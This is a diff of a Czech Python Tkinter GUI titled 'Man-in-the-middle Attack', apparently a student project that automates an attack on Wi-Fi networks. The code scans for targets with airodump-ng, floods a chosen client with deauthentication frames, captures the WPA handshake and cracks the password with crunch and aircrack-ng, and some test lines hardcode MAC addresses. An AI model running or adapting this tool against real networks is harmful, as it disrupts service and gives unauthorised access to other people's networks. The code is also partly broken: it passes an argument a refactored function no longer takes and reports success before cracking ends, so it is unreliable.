@@ -15,38 +15,59 @@ import csv
 # ========================================================================================================================
 # Globální proměnná s názvem interface pro monitorovací mód
 interface = ""
-# Globální proměnná pro uchování reference na proces airodump-ng
-airodump_process = None
-airodump_client_process = None
-deauth_process = None
-aircrack_process = None
-# Globální flag pro ukončení threadu se čtením ze souboru
-stop_reading_file = False
-capture = None
 
+# Globální proměnné nutné pro připojení k síti:
+# Název sítě (net), MAC adresa Access Pointu (ap), MAC adresa klienta (cl), Kanál, na kterém se vysílá (ch), Heslo pro připojení (password)
 net = ""
 ap = ""
 cl = ""
 ch = ""
 password = ""
 
+# Globální proměnná pro uchování reference na nekončící procesy pro jejich pozdější ukončení
+airodump_process = None
+airodump_client_process = None
+deauth_process = None
+aircrack_process = None
+# Globální flag pro ukončení threadu se čtením ze souboru TODO jakého souboru? přejmenovat!
+stop_reading_file = False
+
+# Pomocná proměnná, pomocí které vypisuju výstup z airodump an stdout.... asi špatně používaná TODO delete
+capture = None
+
+# Názvy výstupních a pomocných souborů
 output_airodump = "out_airdump"
 output_handshake = "out_handshake"
-output_handshake_only = "eapol_only.cap"
+output_handshake_only = "eapol_only.cap"    # Tohle přece nepotřebuju...
 output_password = "password.txt"
-file_name = output_airodump + "-01.csv"
+
 # Uklidím případný soubor output_airodump-01.csv po předešlém spuštění
+file_name = output_airodump + "-01.csv"
 if os.path.isfile(file_name):
     os.remove(file_name)
 
-file_name = output_handshake + "-01.csv"
-# Uklidím případný soubor output_airodump-01.csv po předešlém spuštění
+# Uklidím případný soubor output_handshake-01.csv po předešlém spuštění
+#file_name = output_handshake + "-01.csv"
+#if os.path.isfile(file_name):
+#    os.remove(file_name)
+
+files_in_current_dir = os.listdir('.')
+
+# Filter files that start with the prefix
+files_to_delete = [file for file in files_in_current_dir if file.startswith(output_handshake)]
+
+# Delete the filtered files
+for file in files_to_delete:
+    os.remove(file)
+
+file_name = output_handshake_only
 if os.path.isfile(file_name):
     os.remove(file_name)
+
 
 # ========================================================================================================================
 # ==== T1 ================================================================================================================
-def run_iwconfig():
+def find_wifi_interfaces():
     # Clear the text area
     interfaces_field.delete(0, tk.END)
     
@@ -74,7 +95,7 @@ def interfaces_on_select(event):
     monitor_on_button.configure(state=NORMAL)
 # ========================================================================================================================
 # ========================================================================================================================
-def run_airmon_on():
+def start_monitor_mode():
     print(f"Interface v airmonu_on: {interface}")
     try:
         # Deaktivujte rozhraní
@@ -89,16 +110,16 @@ def run_airmon_on():
         status.config(text=f"Rozhraní {interface} bylo úspěšně přepnuto do monitorovacího módu.")
         print(f"Rozhraní {interface} bylo úspěšně přepnuto do monitorovacího módu.")
 
-        monitor_off_button.configure(state=NORMAL) #######################################################################
-        monitor_on_button.configure(state=DISABLED) ######################################################################
-        airodump_on_button.configure(state=NORMAL) #######################################################################
+        monitor_off_button.configure(state=NORMAL) 
+        monitor_on_button.configure(state=DISABLED)
+        airodump_on_button.configure(state=NORMAL) 
 
     except subprocess.CalledProcessError as e:
         #monitor_label.config(text=f"Chyba při nastavování monitorovacího módu: {e}")
         status.config(text=f"Chyba při nastavování monitorovacího módu: {e}")
         print(f"Chyba při nastavování monitorovacího módu: {e}")
 # ========================================================================================================================
-def run_airmon_off():
+def stop_monitor_mode():
     print(f"Interface v airmonu_off: {interface}")
     try:
         # Deaktivujte rozhraní
@@ -110,8 +131,8 @@ def run_airmon_off():
         status.config(text=f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")
         print(f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")
 
-        monitor_on_button.configure(state=NORMAL) ########################################################################
-        monitor_off_button.configure(state=DISABLED) #####################################################################
+        monitor_on_button.configure(state=NORMAL) 
+        monitor_off_button.configure(state=DISABLED) 
 
     except subprocess.CalledProcessError as e:
         status.config(text=f"Chyba při nastavování normálního módu: {e}")
@@ -138,7 +159,7 @@ def get_mac_address(iface):
         return "Failed to execute ifconfig. Make sure the command exists and the interface name is correct."
 # ======================================================================================================================== 
 # Spustí příkaz airodump-ng na zvoleném interfacu v samostatném procesu a výsledek zapisuje do souboru
-def start_airodump():
+def start_airodump_full():
     global airodump_process
     global capture
 
@@ -154,7 +175,7 @@ def start_airodump():
     Thread(target=process_csv, daemon=True).start()
 # ========================================================================================================================
 # Funkce pro ukončení airodump-ng
-def stop_airodump():
+def stop_airodump_full():
     print("-- Ukončuji airodump.")
     airodump_off_button.configure(state=DISABLED) 
     airodump_on_button.configure(state=NORMAL) 
@@ -170,7 +191,7 @@ def stop_airodump():
 # Funkce pro načtení csv souboru a jeho následné zpracování
 def process_csv():
     print("-- Začínám zpracovávat CSV.")
-    #time.sleep(2)  # Krátká pauza, aby se stihl vytvořit zdrojový soubor
+
     global stop_reading_file
     global output_airodump
     output_airodump = output_airodump+"-01.csv"
@@ -382,49 +403,80 @@ def start_handshake_catch():
     #Příkaz shellu airmon-ng, který budu spouštět v samostatném vlákně
     command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface}"
 
+
+    # FOR TESTING ONLY!:
+    #command_catch_handshake = f"sudo airodump-ng -c5 -d CC:2D:E0:C2:EE:6B -w out_handshake wlan1"
+
+    print("===========================")
+    print("START HANDSHAKE CATCHING...")
+    print("COMMAND: " + command_catch_handshake)
+    
+    # Pro názornost vypíšu spouštěný příkaz do labelu
     handshake_command.configure(text=command_catch_handshake)
 
     # Nastavuji správně tlačítka
     handshake_catch_on_button.configure(state=DISABLED) 
     handshake_catch_off_button.configure(state=NORMAL) 
 
-    # Spouštím process zachytávání handshaku na zvoleném rozhrané
+    # Spouštím process zachytávání handshaku na zvoleném rozhraní
     # TODO použití exception pro spuštění child processu
-    global airodump_client_process
+    global airodump_target_process
     global capture
 
-    airodump_client_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    print(" - spuštím airodump na target")
+    # TODO tady je zatím výstup na stdout - později změnit na PIPE
+    #airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+    # Dám tomu čas na vytvoření souborů - možná netřeba TODO test
+    print(" - airodump na target byl spuštěn")
+
+    print(" - START parsovani " + output_handshake)
+    global output_handshake_only
+    print(" - Output file: "+ output_handshake_only)
+    #tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" -w {output_handshake_only}"
+    #print(" - COMMAND: " + tshark_command)
+
+    print(" - Spouštím thread s parsováním .cap")
+    Thread(target=parse_handshake_cap, daemon=True).start()
+    print(" - Thread s parsováním byl spuštěn")
+
+    """
     time.sleep(1)
+    #detect_eapol()
+    # parse_handshake_cap(tshark_command)
+    """
 
-    # TEST =============================================
-    detect_eapol()
-
+    print("STOPPED HANDSHAKE CATCHING... (OND OF FUNCTION)")
+    print("=============================")
 # ========================================================================================================================
 def stop_handshake_catch():
     # Zastavuji progress bar pro zachytavani handshaku
     handshake_catch_progress.stop()
 
-    global airodump_client_process
-    if airodump_client_process:
-        os.killpg(os.getpgid(airodump_client_process.pid), signal.SIGTERM)
+    global airodump_target_process
+    if airodump_target_process:
+        os.killpg(os.getpgid(airodump_target_process.pid), signal.SIGTERM)
         print("  -- Process zachytávání handshaku byl ukončen.")
 
     # Nastavuji správně tlačítka
     handshake_catch_on_button.configure(state=NORMAL) 
     handshake_catch_off_button.configure(state=DISABLED) 
-
 # ========================================================================================================================
-def start_deauth():
+def start_deauthentification():
+    # Zapínám pohyb progress baru
     deauth_progress.start(10)
-    #deauth_cadency = 0
+
+    #deauth_cadency = 0 nebo 10 ?
     # Testování funkčních hodnot ( --ignore-negative-one  )
-    deauth_cadency = 10
-    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} -D -c {cl} -a {ap} {interface}"
+    deauth_cadency = 0
+    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c {cl} -a {ap} {interface}"
+    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c BC:1A:E4:92:5E:25 -a CC:2D:E0:C2:EE:6B wlan1"
 
-    #deauth_command_label.configure(text="Spouštěný příkaz: ")
-    deauth_command.configure(text=command_deauth)
+    #Vypíšu pro názornost spouštěný příkaz
+    deauth_command_label.configure(text=command_deauth)
 
-    # Spouštím proces posílání deauthentifikačních rámců na klienta
+    # Spouštím proces posílání deauthentifikačních rámců na klienta. Jeho PID si uložím pro pozdější zastavení
+    # TODO tady na to nemusí být samostatný vlákno? ======================
     global deauth_process 
     deauth_process = subprocess.Popen(command_deauth, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
 
@@ -432,10 +484,7 @@ def start_deauth():
     deauth_on_button.configure(state=DISABLED) 
     deauth_off_button.configure(state=NORMAL) 
 # ========================================================================================================================
-def stop_deauth():
-    # Zastavuji progress bar pro zachytavani handshaku
-    deauth_progress.stop()
-
+def stop_deauthentification():
     # Zastavuji process posílání deauth paketů
     global deauth_process
     if deauth_process:
@@ -445,42 +494,71 @@ def stop_deauth():
     # Nastavuji správně tlačítka
     deauth_on_button.configure(state=NORMAL) 
     deauth_off_button.configure(state=DISABLED)
-# ========================================================================================================================
-def parse_handshake_cap(eapol_command):
-    captured = False
-    print("Začínám cyklus čtení wpa-good")
-    print("Captured: " + str(captured))
-    print("Command: "+ eapol_command)
-    print("Handshake only file: "+ output_handshake_only)
 
+    # Zastavuji progress bar pro zachytavani handshaku
+    deauth_progress.stop()
+# ========================================================================================================================
+def parse_handshake_cap():
+    captured = False
+    tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" -w {output_handshake_only}"
+    #print("Začínám cyklus čtení wpa-good")
+    print("     - Začínám cyklus čtení " + output_handshake)
+    print("     - Captured: " + str(captured))
+    print("     - Command: "+ tshark_command)
+    print("     - Handshake only file: "+ output_handshake_only)
+
+
+    #print("     - Handshake ještě nebyl zachycen a vjížím do while...")
+    handshake_finished_label.config(text="Handshake ještě nebyl zachycen...", fg='grey')
+    
     while not captured:
         try:
-            subprocess.run(eapol_command, shell=True, check=True)
+            tshark_process = subprocess.Popen(tshark_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+            time.sleep(1)  # Wait for 1 second before checking again
+            #print("         ---testing---")
+            #i = 0 
+            #out, err = tshark_process.communicate()   
+            #nlines = len(out.splitlines())
+            #if nlines == 4:
+            #    print("     - Captured i==4")
+
+            #for line in out.split('\n'):
+            #     i += 1
+            # if i == 4:
+            #     print("     - Captured i==4")
+
+            #subprocess.run(tshark_command, shell=True, check=True)
             #with open(output_handshake_only, "r") as file:
             #    lines = file.readlines()
             if os.path.exists(output_handshake_only):
                 file_size = os.path.getsize(output_handshake_only)
                 if file_size >= 500:
                     handshake_finished_label.config(text="Handshake byl zachycen!", fg='green')
+                    print("     - Captured >500")
                     captured = True
-                else:
-                    handshake_finished_label.config(text="Handshake ještě nebyl zachycen...", fg='grey')
+
         except FileNotFoundError:
-            label_text = "File not found. Waiting..."
-         
+            status.config(text="File not found. Waiting...")
+            print("     - No file to read...")
         # Kontroluji soubor každou sekundu
-        time.sleep(1)  # Wait for 1 second before checking again
-    print("Zachycen HS, ukončuji vlakno.")
+        pass
+    print("     - Zachycen handshake, ukončuji vlakno.")
 # =======================================================================================================================
 def detect_eapol():
-    print("START parsovani wpa-good.")
+    #print("START parsovani wpa-good.")
+    print("===========================")
+    print("START parsovani " + output_handshake)
     global output_handshake_only
     print("Output file: "+ output_handshake_only)
-    eapol_command = f"tshark -r wpa-good.cap -Y \"eapol\" -w {output_handshake_only}"
-    print("Command: " + eapol_command)
-    # Run the task in a separate thread to avoid blocking the main program or GUI
-    Thread(target=parse_handshake_cap(eapol_command), daemon=True).start
-    print("END parsovani wpa-good.")
+    tshark_command = f"tshark -r {output_handshake}.cap -n -Y \"eapol\" -w {output_handshake_only}"
+    print("Command: " + tshark_command)
+    # Spustím to v samostatném vlákně
+
+    # Tady to asi musí být ve vlákně, jinak se mi to sekne ve whilu
+    # parse_handshake_cap(tshark_command) 
+    Thread(target=parse_handshake_cap(tshark_command), daemon=True).start()
+    #print("END parsovani " + output_handshake)
+    print("Spustil jsem thread s parsovanim " + output_handshake + " a ukončuji tuto funkci")
 # ========================================================================================================================
 # ========================================================================================================================
 def crunch(min, max, chars, output):
@@ -592,6 +670,7 @@ def crack_pw():
     global aircrack_process
     aircrack_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
     Thread(target=grep_aircrack_process, daemon=True).start()
+    # TODO check jestli se tohle nezobrazí dřív, než doběhne lámání helsa
     status.config(text="Heslo bylo úspěšně prolomeno!")
 
 # ========================================================================================================================
@@ -651,8 +730,7 @@ root = tk.Tk()
 root.title("Man-in-the-middle Attack")
 icon = PhotoImage(file='sword.png')   
 root.tk.call('wm', 'iconphoto', root._w, icon)
-root.geometry("1500x900")
-#global filename
+root.geometry("1500x1000")
 
 # Registrace signal handleru pro SIGINT pro ukončení airodump-ng pomocí CTRL+C
 root.bind_all('<Control-c>', destroyer)
@@ -675,7 +753,7 @@ notebook.add(tab2, text="Záchyt handshaku")
 notebook.add(tab3, text="Prolomení hesla")
 notebook.add(tab4, text="Man-in-the-middle")
 notebook.add(tab5, text="Odposlech DNS dotazů")
-frame_t1 = ttk.Frame(tab1)
+frame_t1 = Frame(tab1)
 frame_t2 = ttk.Frame(tab2)
 frame_t3 = ttk.Frame(tab3)
 frame_t4 = ttk.Frame(tab4)
@@ -700,11 +778,11 @@ btn_next.pack(side=tk.RIGHT, fill='y')
 update_button_state()
 # Tab "Vyhledání cílů" ==================================================================================================================
 # Interface frame ========================================================================
-interface_frame = LabelFrame(frame_t1, text="Vyhledání a výběr požadovaného interfacu")
+interface_frame = LabelFrame(frame_t1, text="Vyhledání a výběr požadovaného rozhraní")
 interface_frame.pack(padx=10,pady=5, fill='x', expand=1)  # WTF Todle není rozatežný po celé šířce?!
 
 # Create a button to run iwconfig command
-interface_button = tk.Button(interface_frame, text="Show Wireless Interfaces", command=run_iwconfig)
+interface_button = tk.Button(interface_frame, text="Najít Wi-fi rozhraní", command=find_wifi_interfaces)
 interface_button.grid(row=0, column=0)
 
 # Create a scrolled text area widget
@@ -713,20 +791,20 @@ interfaces_field.bind('<<ListboxSelect>>', interfaces_on_select)
 interfaces_field.grid(row=0, column= 1, pady=5)
 
 # Monitor mode frame ========================================================================
-monitor_frame = LabelFrame(frame_t1, text="Přepnutí interfacu do monitorovacího módu")
+monitor_frame = LabelFrame(frame_t1, text="Přepnutí rozhraní do monitorovacího módu")
 monitor_frame.pack(padx=10,pady=5, fill='x')
 
-monitor_on_button = tk.Button(monitor_frame, text="Turn monitor mode ON", state=DISABLED, command=run_airmon_on)
-monitor_off_button = tk.Button(monitor_frame, text="Turn monitor mode OFF", state=DISABLED, command=run_airmon_off)
+monitor_on_button = tk.Button(monitor_frame, text="Spustit monitorovací mód", state=DISABLED, command=start_monitor_mode)
+monitor_off_button = tk.Button(monitor_frame, text="Vypnout monitorovací mód", state=DISABLED, command=stop_monitor_mode)
 monitor_on_button.grid(row=0, column=0)
 monitor_off_button.grid(row=0, column=1)
 
 # Airodump frame ========================================================================
-airodump_frame = LabelFrame(frame_t1, text="Záchyt airodump-ng")
+airodump_frame = LabelFrame(frame_t1, text="Záchyt komunikace v okolí")
 airodump_frame.pack(padx=10,pady=5, fill='x')
 
-airodump_on_button = tk.Button(airodump_frame, text="Run airodump-ng", state=DISABLED, command=lambda: Thread(target=start_airodump).start())
-airodump_off_button = tk.Button(airodump_frame, text="Stop airodump-ng", state=DISABLED, command=stop_airodump)
+airodump_on_button = tk.Button(airodump_frame, text="Spustit airodump-ng", state=DISABLED, command=lambda: Thread(target=start_airodump_full).start())
+airodump_off_button = tk.Button(airodump_frame, text="Zastavit airodump-ng", state=DISABLED, command=stop_airodump_full)
 airodump_on_button.grid(row=0, column=0)
 airodump_off_button.grid(row=0, column=1)
 
@@ -734,9 +812,8 @@ airodump_off_button.grid(row=0, column=1)
 #airodump_field = scrolledtext.ScrolledText(airodump_frame)
 #airodump_field.pack(padx=10,pady=5, fill='x')
 
-#load_and_display_csv()
 # Treeview pro Access Pointy
-tree_ap_label = Label(airodump_frame, text="Seznam Access pointů")
+tree_ap_label = Label(airodump_frame, text="Seznam Access Pointů")
 tree_ap_label.grid(row=1, column=0, columnspan=3)
 
 tree_ap = ttk.Treeview(airodump_frame, selectmode='browse')
@@ -756,6 +833,7 @@ tree_cl.grid(row=4, column=0, columnspan=3, sticky=W)
 #scrollbarv_cl.pack(side='right', fill='y')
 #tree_cl.configure(yscrollcommand=scrollbarv_cl.set)
 
+# TODO přejmenovat tyto pole do češtiny
 target_net_label = Label(airodump_frame, text="TARGET NETWORK:", font=('Helvetica', 20))
 target_net = Label(airodump_frame, text="", font=('Helvetica', 20), fg='green')
 target_ap_label = Label(airodump_frame, text="TARGET ACCES POINT:", font=('Helvetica', 20))
@@ -780,9 +858,13 @@ target_ch.grid(row=8, column=1, sticky=W)
 handshake_catch_frame = LabelFrame(frame_t2, text="Záchyt WPA handshaku")
 handshake_catch_frame.pack(padx=10,pady=5, fill='x')
 
-handshake_catch_label = Label(handshake_catch_frame, text="Spustit proces na zachytávání komunikace Clienta s AP a zachycením WPA handshaku:")
-#handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=start_handshake_catch)
-handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=detect_eapol)
+handshake_catch_label = Label(handshake_catch_frame, text="Spustit proces na zachytávání komunikace klienta s AP a zachycením WPA handshaku:")
+
+
+handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=start_handshake_catch)
+#handshake_catch_on_button = Button(handshake_catch_frame, text="Spustit", command=detect_eapol)
+
+
 handshake_catch_off_button = Button(handshake_catch_frame, text="Zastavit", state=DISABLED, command=stop_handshake_catch)
 handshake_catch_label.grid(row=0, column=0)
 handshake_catch_on_button.grid(row=0,column=1, pady=5)
@@ -806,8 +888,8 @@ deauth_frame = LabelFrame(frame_t2, text="Deauthentifikace target klienta")
 deauth_frame.pack(padx=10,pady=5, fill='x')
 
 deauth_label = Label(deauth_frame, text="Spustit proces odpojování komunikace Clienta s AP pro opětovné zaslání handshake:")
-deauth_on_button = Button(deauth_frame, text="Spustit", command=start_deauth)
-deauth_off_button = Button(deauth_frame, text="Zastavit", state=DISABLED, command=stop_deauth)
+deauth_on_button = Button(deauth_frame, text="Spustit", command=start_deauthentification)
+deauth_off_button = Button(deauth_frame, text="Zastavit", state=DISABLED, command=stop_deauthentification)
 deauth_label.grid(row=0, column=0)
 deauth_on_button.grid(row=0,column=1, pady=5)
 deauth_off_button.grid(row=0,column=2, pady=5)
@@ -816,8 +898,8 @@ deauth_progress = ttk.Progressbar(deauth_frame, orient=HORIZONTAL, length=800, m
 deauth_progress.step(0)
 deauth_progress.grid(row=1,column=0,columnspan=3)
 
-deauth_command = Label(deauth_frame, text="")
-deauth_command.grid(row=2, column=0, columnspan=3)
+deauth_command_label = Label(deauth_frame, text="")
+deauth_command_label.grid(row=2, column=0, columnspan=3)
 
 # ========================================================================================================================================
 # Tab "Prolomení hesla" ==================================================================================================================
